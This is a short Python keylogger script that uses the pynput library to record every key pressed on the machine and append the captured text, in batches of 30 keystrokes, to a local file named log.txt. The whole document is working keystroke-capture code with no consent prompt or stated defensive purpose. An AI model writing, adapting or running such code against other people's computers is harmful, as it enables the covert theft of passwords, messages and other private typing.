#import pyinput

from pynput.keyboard import Key, Listener

max_count = 30
count = 0
keys = []

def on_press(key):
	global keys, count

	keys.append(key)
	count += 1

	if count > max_count:
		write_file(keys)
		count = 0
		keys = []

def write_file(keys):
	with open("log.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find('space') > 0:
				f.write(' ')
			elif k.find("Key") == -1:
				f.write(k)

with Listener(on_press=on_press) as listener:
	listener.join()